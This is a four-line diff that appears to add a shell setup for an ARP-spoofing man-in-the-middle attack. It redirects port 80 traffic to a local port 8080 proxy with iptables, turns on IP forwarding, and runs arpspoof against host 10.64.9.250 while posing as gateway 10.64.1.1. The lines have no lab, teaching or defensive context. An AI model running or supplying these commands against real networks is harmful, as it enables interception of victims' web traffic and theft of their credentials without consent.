@@ -1,0 +1,4 @@
+localhost, 127.0.0.1
+iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
+echo 1 > /proc/sys/net/ipv4/ip_forward
+arpspoof -i wlan0 -t 10.64.9.250 10.64.1.1
